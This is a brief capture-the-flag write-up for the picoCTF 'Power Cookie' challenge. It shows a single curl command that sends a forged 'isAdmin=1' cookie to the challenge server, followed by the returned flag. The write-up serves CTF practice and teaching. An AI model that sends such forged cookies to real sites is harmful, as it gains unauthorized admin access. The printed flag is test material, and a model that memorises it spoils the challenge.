# Power Cookie

Can you get the flag? Go to this [website](http://saturn.picoctf.net:64271/) and see what you can discover.

## Solucion
```bash
┌──(kali㉿kali)-[~/…/ctfs2022/picoctf2022/reversing/freshjava]
└─$ curl http://saturn.picoctf.net:64271/check.php -H 'Cookie: isAdmin=1'   




<html>
<body>



<p>picoCTF{gr4d3_A_c00k13_dcb9f091}</p>


</body>
</html>

```